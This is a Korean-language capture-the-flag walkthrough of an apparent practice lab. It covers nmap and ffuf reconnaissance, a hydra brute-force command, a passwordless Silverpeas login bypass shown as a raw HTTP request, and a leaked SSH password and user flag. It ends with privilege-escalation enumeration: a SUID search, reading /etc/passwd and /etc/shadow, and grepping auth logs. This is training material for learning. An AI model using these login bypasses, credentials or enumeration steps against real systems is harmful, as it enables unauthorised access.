10.10.96.166

# 단서 발견

<p>If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".</p>

1. Silverpeas
2. scr1ptkiddy

# nmap

nmap -Pn -sV -T4 -sC --open -oN nmap.txt 10.10.96.166

```
# Nmap 7.95 scan initiated Tue Jul 15 14:20:08 2025 as: /usr/lib/nmap/nmap -Pn -sV -T4 -sC --open -oN namp.txt 10.10.96.166
Nmap scan report for 10.10.96.166
Host is up (0.30s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 1b:1c:87:8a:fe:34:16:c9:f7:82:37:2b:10:8f:8b:f1 (ECDSA)
|_  256 26:6d:17:ed:83:9e:4f:2d:f6:cd:53:17:c8:80:3d:09 (ED25519)
80/tcp   open  http       nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Hack Smarter Security
8080/tcp open  http-proxy
|_http-title: Error
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Tue, 15 Jul 2025 14:20:23 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SMBProgNeg, SSLSessionReq, Socks5, TLSSessionReq, TerminalServerCookie:
|     HTTP/1.1 400 Bad Request
|     Content-Length: 0
|     Connection: close
|   GetRequest:
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Tue, 15 Jul 2025 14:20:21 GMT
|     <html><head><title>Error</title></head><body>404 - Not Found</body></html>
|   HTTPOptions:
|     HTTP/1.1 404 Not Found
|     Connection: close
|     Content-Length: 74
|     Content-Type: text/html
|     Date: Tue, 15 Jul 2025 14:20:22 GMT
|_    <html><head><title>Error</title></head><body>404 - Not Found</body></html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=7/15%Time=687663A6%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r
SF:\nContent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Tue,\
SF:x2015\x20Jul\x202025\x2014:20:21\x20GMT\r\n\r\n<html><head><title>Error
SF:</title></head><body>404\x20-\x20Not\x20Found</body></html>")%r(HTTPOpt
SF:ions,C9,"HTTP/1\.1\x20404\x20Not\x20Found\r\nConnection:\x20close\r\nCo
SF:ntent-Length:\x2074\r\nContent-Type:\x20text/html\r\nDate:\x20Tue,\x201
SF:5\x20Jul\x202025\x2014:20:22\x20GMT\r\n\r\n<html><head><title>Error</ti
SF:tle></head><body>404\x20-\x20Not\x20Found</body></html>")%r(RTSPRequest
SF:,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConn
SF:ection:\x20close\r\n\r\n")%r(FourOhFourRequest,C9,"HTTP/1\.1\x20404\x20
SF:Not\x20Found\r\nConnection:\x20close\r\nContent-Length:\x2074\r\nConten
SF:t-Type:\x20text/html\r\nDate:\x20Tue,\x2015\x20Jul\x202025\x2014:20:23\
SF:x20GMT\r\n\r\n<html><head><title>Error</title></head><body>404\x20-\x20
SF:Not\x20Found</body></html>")%r(Socks5,42,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Gener
SF:icLines,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\
SF:r\nConnection:\x20close\r\n\r\n")%r(Help,42,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(SS
SF:LSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x
SF:200\r\nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,42,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20
SF:close\r\n\r\n")%r(TLSSessionReq,42,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(Kerberos,42
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(SMBProgNeg,42,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n")%r(LPDStr
SF:ing,42,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Length:\x200\r\nC
SF:onnection:\x20close\r\n\r\n")%r(LDAPSearchReq,42,"HTTP/1\.1\x20400\x20B
SF:ad\x20Request\r\nContent-Length:\x200\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul 15 14:21:59 2025 -- 1 IP address (1 host up) scanned in 110.81 seconds
```

# 취약점 의심 -> 딱히 유용한 취약점은 아님

- https://www.cve.org/CVERecord?id=CVE-2021-36368
- https://www.cve.org/CVERecord?id=CVE-2023-28531

# ffuf 1차 경로 시도 : torsocks ffuf -u http://10.10.96.166/FUZZ -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt

# tor 를 사용하므로 스레드 5~10 정도

# ffuf, gobuster, amass ❌ 작동 안 함 Go 기반 / glibc 미사용

torsocks ffuf -u http://10.10.96.166/FUZZ -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -o ffuf1.txt -t 20

└─# torsocks ffuf -u http://10.10.96.166/FUZZ -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.10.96.166/FUZZ
:: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500

---

assets [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 271ms]
images [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 271ms]
:: Progress: [151265/151265] :: Job [1/1] :: 115 req/sec :: Duration: [0:20:09] :: Errors: 0 ::

# 1차 결과

- assets
- images

# 2차 서브 도메인 시도~ 여러 파일 실행해보기 : ffuf -u http://10.10.96.166 -H "Host:FUZZ.10.10.96.166" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o ffuf2.txt -t 100 -fs 14124

┌──(root㉿docker-desktop)-[/]
└─# ffuf -u http://10.10.96.166 -H "Host:FUZZ.10.10.96.166" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o ffuf2.txt -t 100 -fs 14124

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.10.96.166
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
:: Header : Host: FUZZ.10.10.96.166
:: Output file : ffuf2.txt
:: File format : json
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 100
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500
:: Filter : Response size: 14124

---

:: Progress: [114442/114442] :: Job [1/1] :: 359 req/sec :: Duration: [0:06:28] :: Errors: 0 ::

# 80 말고 unknown 8080 도 시도

# ffuf -u http://10.10.96.166:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

──(root㉿docker-desktop)-[/]
└─# ffuf -u http://10.10.96.166:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://10.10.96.166:8080/FUZZ
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 40
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500

---

website [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 298ms]
console [Status: 302, Size: 0, Words: 1, Lines: 1, Duration:

- website, console 발견

# 접근 8080

┌──(root㉿docker-desktop)-[/]
└─# http http://10.10.96.166:8080/website/
HTTP/1.1 403 Forbidden
Connection: keep-alive
Content-Length: 68
Content-Type: text/html;charset=UTF-8
Date: Wed, 16 Jul 2025 14:36:41 GMT

<html><head><title>Error</title></head><body>Forbidden</body></html>

┌──(root㉿docker-desktop)-[/]
└─# http http://10.10.96.166:8080/console/
HTTP/1.1 302 Found
Connection: keep-alive
Content-Length: 0
Date: Wed, 16 Jul 2025 14:36:50 GMT
Location: /noredirect.html

# /console 접근 시 -> noredirect.html 로 리다이렉트

# noredirect.html 새로운 경로 발견 -> 시도 -> 아무것도 없음 404

──(root㉿docker-desktop)-[/]
└─# http http://10.10.96.166:8080/noredirect.html
HTTP/1.1 404 Not Found
Connection: keep-alive
Content-Length: 74
Content-Type: text/html
Date: Wed, 16 Jul 2025 14:38:56 GMT

<html><head><title>Error</title></head><body>404 - Not Found</body></html>

# 다 안 됨 -> 공격 표면이 상당히 찾기 어려움 -> 다시 처음으로 돌아가서 단서 활용하기 -> 80 또는 8080 뒤에 경로로 넣어보기

1. Silverpeas
2. scr1ptkiddy

# 힌트 기반으로 시도 -> 새로운 페이지 열림 -> 인트라넷이라고 나옴

http://10.10.157.2:8080/silverpeas/defaultLogin.jsp

- 로그인 테스트
  http://10.10.157.2:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=1

# hydra 로그인 프루브 포싱

hydra -l scr1ptkiddy -P passwords.txt 10.10.157.2 http-post-form \
"/silverpeas/jsp/login.jsp:username=^USER^&password=^PASS^&DomainId=0:Location"

# Google CEV 발견 -> scr1ptkiddy 로그인 시 password 없이 로그인 가능

# 버프 스위트

![](https://velog.velcdn.com/images/agnusdei1207/post/9283f92b-10a8-4cf3-958a-c34c16a86502/image.png)

POST /silverpeas/AuthenticationServlet HTTP/1.1
Host: 10.10.157.2:8080
Content-Length: 38
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.157.2:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10*15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/\_;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.157.2:8080/silverpeas/defaultLogin.jsp
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=ynxIq7QIzMeWyFR1tQ1FZCq9e9DT0Ks1TlnSIJn2.ebabc79c6d2a
Connection: keep-alive

Login=scr1ptkiddy&Password=&DomainId=0

# scr1ptkiddy 인증 됨

GET /silverpeas/Main//look/jsp/MainFrame.jsp HTTP/1.1
Host: 10.10.157.2:8080
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10*15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/\_;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.157.2:8080/silverpeas/defaultLogin.jsp?DomainId=0&ErrorCode=2
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=ynxIq7QIzMeWyFR1tQ1FZCq9e9DT0Ks1TlnSIJn2.ebabc79c6d2a; defaultDomain=0; svpLogin=scr1ptkiddy
Connection: keep-alive

# 접근 가능

![](https://velog.velcdn.com/images/agnusdei1207/post/f8600306-85aa-419e-b879-576bf18e81c8/image.png)

http://10.10.157.2:8080/silverpeas/look/jsp/MainFrame.jsp

# silveradmin@localhost

# Administrateur

# Manager

![](https://velog.velcdn.com/images/agnusdei1207/post/df68857c-befb-40b7-9ca7-48150afa7efa/image.png)
![](https://velog.velcdn.com/images/agnusdei1207/post/78890476-6e63-4485-a074-0068132e8305/image.png)

# notification ID5 확인

![](https://velog.velcdn.com/images/agnusdei1207/post/f0a7859b-e9f1-4d50-bb4c-8a3a3febbcd6/image.png)

# Manager 인증 됨 -> 알림 확인 -> SSH 정보 노출

![](https://velog.velcdn.com/images/agnusdei1207/post/fb70746a-1bbd-417c-a1e4-68560a724423/image.png)

Dude how do you always forget the SSH password? Use a password manager and quit using your silly sticky notes.

# Username 아이디: tim

# Password 비밀번호: cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol

# ssh tim@10.10.157.2 -> SSH 접속 성공

tim@silver-platter:~$ ls
user.txt
tim@silver-platter:~$ cat user.txt
THM{c4ca4238a0b923820dcc509a6f75849b}
tim@silver-platter:~$

# Privilege-escalation

# SUID + 실행 가능 파일 찾기

tim@silver-platter:~$ find / -perm -4000 -type f -executable -exec ls -l {} \; 2>/dev/null
-rwsr-xr-x 1 root root 85064 Feb 6 2024 /snap/core20/2264/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Feb 6 2024 /snap/core20/2264/usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Feb 6 2024 /snap/core20/2264/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 May 30 2023 /snap/core20/2264/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Feb 6 2024 /snap/core20/2264/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Feb 6 2024 /snap/core20/2264/usr/bin/passwd
-rwsr-xr-x 1 root root 67816 May 30 2023 /snap/core20/2264/usr/bin/su
-rwsr-xr-x 1 root root 166056 Apr 4 2023 /snap/core20/2264/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 May 30 2023 /snap/core20/2264/usr/bin/umount
-rwsr-xr-x 1 root root 477672 Jan 2 2024 /snap/core20/2264/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 85064 Nov 29 2022 /snap/core20/1974/usr/bin/chfn
-rwsr-xr-x 1 root root 53040 Nov 29 2022 /snap/core20/1974/usr/bin/chsh
-rwsr-xr-x 1 root root 88464 Nov 29 2022 /snap/core20/1974/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55528 May 30 2023 /snap/core20/1974/usr/bin/mount
-rwsr-xr-x 1 root root 44784 Nov 29 2022 /snap/core20/1974/usr/bin/newgrp
-rwsr-xr-x 1 root root 68208 Nov 29 2022 /snap/core20/1974/usr/bin/passwd
-rwsr-xr-x 1 root root 67816 May 30 2023 /snap/core20/1974/usr/bin/su
-rwsr-xr-x 1 root root 166056 Apr 4 2023 /snap/core20/1974/usr/bin/sudo
-rwsr-xr-x 1 root root 39144 May 30 2023 /snap/core20/1974/usr/bin/umount
-rwsr-xr-x 1 root root 473576 Apr 3 2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 131832 Sep 15 2023 /snap/snapd/20290/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 131832 May 27 2023 /snap/snapd/19457/usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 338536 Aug 24 2023 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 138408 May 29 2023 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 44808 Nov 24 2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 40496 Nov 24 2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root 35200 Mar 23 2022 /usr/bin/fusermount3
-rwsr-xr-x 1 root root 59976 Nov 24 2022 /usr/bin/passwd
-rwsr-xr-x 1 root root 47480 Feb 21 2022 /usr/bin/mount
-rwsr-xr-x 1 root root 72072 Nov 24 2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 232416 Apr 3 2023 /usr/bin/sudo
-rwsr-xr-x 1 root root 55672 Feb 21 2022 /usr/bin/su
-rwsr-xr-x 1 root root 72712 Nov 24 2022 /usr/bin/chfn
-rwsr-xr-x 1 root root 30872 Feb 26 2022 /usr/bin/pkexec
-rwsr-xr-x 1 root root 35192 Feb 21 2022 /usr/bin/umount
-rwsr-xr-x 1 root root 18736 Feb 26 2022 /usr/libexec/polkit-agent-helper-1

# snap/core 는 특정 OS 를 스냅샷 저장한 걸로 보임

# 정보 수집 -> adm 그룹에 속해있음 -> adm 은 일반적으로 /var/log 로그파일에 접근할 수 있는 권한이 있음

# 주로 모니터링 시스템에 사용되는 그룹 adm

tim@silver-platter:~$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
tim@silver-platter:~$ whoami
tim

# 홈 확인 -> tim, tyler 확인됨

tim@silver-platter:~$ ls /home
tim tyler

# cat /etc/passwd -> tyler 발견

tim@silver-platter:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
\_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin

# 발견 -> 1000

tyler:x:1000:1000:root:/home/tyler:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
tim:x:1001:1001::/home/tim:/bin/bash
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin

tim@silver-platter:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
tim@silver-platter:~$

# ls /var/log

alternatives.log auth.log.2 cloud-init.log dmesg.2.gz faillog kern.log.3.gz syslog.1
alternatives.log.1 auth.log.2.gz cloud-init-output.log dmesg.3.gz installer landscape syslog.2.gz
amazon aws114_ssm_agent_installation.log dist-upgrade dmesg.4.gz journal lastlog syslog.3.gz
apt bootstrap.log dmesg dpkg.log kern.log nginx ubuntu-advantage.log
auth.log btmp dmesg.0 dpkg.log.1 kern.log.1 private unattended-upgrades
auth.log.1 btmp.1 dmesg.1.gz dpkg.log.2.gz kern.log.2.gz syslog wtmp

cat /var/log/auth.log
cat /var/log/syslog

# tyler 홈 직접 접근 시도

tim@silver-platter:~$ cd /home/tyler
-bash: cd: /home/tyler: Permission denied

# https://rhinosecuritylabs.com/research/silverpeas-file-read-cves/ -> 실버피스 자체 파일 read 취약점 발견 -> XSS -> 시도 보류

While testing this functionality, we discovered Silverpeas checks for Cross-Site Scripting by filtering out <script> tags in messages. This check can be bypassed by performing XSS without using <script> tags. We first confirmed this by sending a basic “alert” when the message was view by the administrator:

# grep tyler /var/log/\*

tim@silver-platter:~$ grep tyler /var/log/\*
grep: /var/log/amazon: Permission denied
grep: /var/log/apt: Is a directory

# SSH 접근을 42258 로 했어??

/var/log/auth.log.1:May 8 08:58:40 silver-platter sshd[1710]: Accepted password for tyler from 192.168.1.20 port 42258 ssh2
/var/log/auth.log.1:May 8 08:58:40 silver-platter sshd[1710]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.1:May 8 08:58:40 silver-platter systemd-logind[711]: New session 2 of user tyler.

# 타일러 로그인 기록 -> 전반적으로 sudo, su 명령어를 사용함

/var/log/auth.log.1:May 8 08:58:40 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.1:May 8 08:58:44 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.1:May 8 08:58:44 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.1:May 8 08:58:44 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.1:May 8 14:00:53 silver-platter sshd[1946]: Accepted password for tyler from 192.168.1.20 port 55742 ssh2
/var/log/auth.log.1:May 8 14:00:53 silver-platter sshd[1946]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.1:May 8 14:00:53 silver-platter systemd-logind[709]: New session 2 of user tyler.
/var/log/auth.log.1:May 8 14:00:53 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.1:May 8 14:01:11 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.1:May 8 14:01:11 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.1:May 8 14:01:11 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: new group: name=tyler, GID=1000
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: new user: name=tyler, UID=1000, GID=1000, home=/home/tyler, shell=/bin/bash, from=none
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'adm'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'cdrom'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'sudo'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'dip'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'plugdev'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'lxd'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'adm'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'cdrom'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'sudo'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'dip'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'plugdev'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'lxd'
/var/log/auth.log.2:Dec 12 19:32:17 silver-platter login[765]: pam_unix(login:auth): authentication failure; logname=LOGIN uid=0 euid=0 tty=/dev/tty1 ruser= rhost= user=tyler
/var/log/auth.log.2:Dec 12 19:32:20 silver-platter login[765]: FAILED LOGIN (1) on '/dev/tty1' FOR 'tyler', Authentication failure
/var/log/auth.log.2:Dec 12 19:32:32 silver-platter login[765]: pam_unix(login:session): session opened for user tyler(uid=1000) by LOGIN(uid=0)
/var/log/auth.log.2:Dec 12 19:32:32 silver-platter systemd-logind[703]: New session 1 of user tyler.
/var/log/auth.log.2:Dec 12 19:32:32 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 12 19:34:33 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/useradd tim
/var/log/auth.log.2:Dec 12 19:34:33 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:34:40 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/passwd tim
/var/log/auth.log.2:Dec 12 19:34:40 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:35:03 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/usermod -aG adm tim
/var/log/auth.log.2:Dec 12 19:35:03 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:36:10 silver-platter login[735]: pam_unix(login:session): session opened for user tyler(uid=1000) by LOGIN(uid=0)
/var/log/auth.log.2:Dec 12 19:36:10 silver-platter systemd-logind[694]: New session 1 of user tyler.
/var/log/auth.log.2:Dec 12 19:36:10 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 12 19:38:46 silver-platter sudo: pam_unix(sudo:auth): authentication failure; logname=tyler uid=1000 euid=0 tty=/dev/tty1 ruser=tyler rhost= user=tyler
/var/log/auth.log.2:Dec 12 19:39:15 silver-platter sudo: tyler : 3 incorrect password attempts ; TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/apt install nginx
/var/log/auth.log.2:Dec 12 19:39:25 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/apt install nginx
/var/log/auth.log.2:Dec 12 19:39:25 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:39:42 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/systemctl start nginx
/var/log/auth.log.2:Dec 12 19:39:42 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:39:47 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/systemctl enable nginx
/var/log/auth.log.2:Dec 12 19:39:47 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 12 19:39:58 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/sbin/ufw allow 80
/var/log/auth.log.2:Dec 12 19:39:58 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 09:08:18 silver-platter login[745]: pam_unix(login:session): session opened for user tyler(uid=1000) by LOGIN(uid=0)
/var/log/auth.log.2:Dec 13 09:08:18 silver-platter systemd-logind[698]: New session 1 of user tyler.
/var/log/auth.log.2:Dec 13 09:08:18 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 09:08:32 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/sbin/nginx
/var/log/auth.log.2:Dec 13 09:08:32 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:08:51 silver-platter sudo: tyler : TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/systemctl start nginx
